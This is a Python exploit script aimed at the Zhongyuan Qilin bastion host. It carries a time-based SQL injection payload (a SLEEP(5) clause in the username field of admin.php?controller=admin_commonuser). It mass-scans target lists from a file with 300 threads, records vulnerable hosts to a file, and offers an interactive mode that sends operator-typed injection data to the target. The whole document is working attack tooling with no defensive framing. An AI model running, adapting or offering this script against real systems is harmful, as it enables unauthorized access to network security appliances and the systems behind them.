#中远麒麟堡垒机SQL注入漏洞,延时注入
import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
RED_BOLD = '\033[92m'
RESET = '\033[0m'

def banner():
    test = """
 
  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                             
                                                        version:ZY_sleep_sql 1.0.0                                       
"""
    print(test)

def main():
    banner() 
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入漏洞,延时注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(300)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target+url_payload
    headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
		"Accept": "*/*",
		"Accept-Encoding":"gzip, deflate",
        "Content-Type":"application/x-www-form-urlencoded",
		"Connection":"close"
	}
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False)
        time1 = str(res.elapsed.total_seconds())[0]
        # print(time)
        if res.status_code == 200:
            if '4' < time1 <'6':
                print(f"{RED_BOLD}[+] {target} 存在sql延时注入漏洞！{RESET}")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
                    return True
            else:
                print('漏洞不存在!!')
                return False
    except Exception:
        pass

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        code = input('请输入你要执行的语句>')
        if code == 'q':
            print("正在退出，请等候....")
            exit() 
        url_payload = '/admin.php?controller=admin_commonuser'
        url = target+url_payload
        headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding":"gzip, deflate",
            "Content-Type":"application/x-www-form-urlencoded",
            "Connection":"close"
        }
        # data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
        data = f"{code}"
        res = requests.post(url=url,headers=headers,data=data,verify=False)
        time2 = str(res.elapsed.total_seconds())[0]
        # print(time)
        if res.status_code == 200:
            if '4' < time2 <'6':
                print(f"{RED_BOLD}[+]正确! 延时{time2}秒{RESET}")
        else:
            print("!!访问错误!!")


if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()